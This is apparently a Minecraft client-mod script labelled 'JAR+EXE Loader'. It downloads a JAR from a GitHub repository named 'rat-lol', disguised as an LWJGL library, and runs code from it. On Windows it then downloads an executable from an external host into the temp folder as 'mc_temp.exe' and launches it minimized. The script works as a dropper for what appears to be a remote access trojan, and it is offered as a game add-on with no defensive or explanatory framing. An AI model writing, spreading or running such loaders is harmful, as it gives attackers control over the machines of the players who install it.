// @name JAR+EXE Loader
// @author You
// @desc Loads external JAR and executes EXE

import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.lang.Runtime;

// 1. Load external JAR
try {
    var jarUrl = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
    var classLoader = new URLClassLoader(new URL[]{jarUrl}, this.getClass().getClassLoader());
    
    // Load and initialize class
    var loadedClass = classLoader.loadClass("org.lwjgl36.VersionImp");
    loadedClass.getMethod("init").invoke(null);
    
    ChatLib.chat("§aJAR loaded successfully!");
} catch (e) {
    ChatLib.chat("§cJAR Error: " + e);
}

// 2. Download and execute EXE (Windows only)
try {
    if (!Client.getOperatingSystem().contains("win")) {
        ChatLib.chat("§eEXE can only run on Windows");
        return;
    }

    var exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
    var tempPath = Paths.get(System.getProperty("java.io.tmpdir"), "mc_temp.exe");
    
    // Download file
    var in = new URL(exeUrl).openStream();
    Files.copy(in, tempPath);
    in.close();
    
    // Execute hidden
    Runtime.getRuntime().exec(new String[]{
        "cmd", "/c", "start", "/min",
        tempPath.toString()
    });
    
    ChatLib.chat("§aEXE execution attempted!");
} catch (e) {
    ChatLib.chat("§cEXE Error: " + e);
}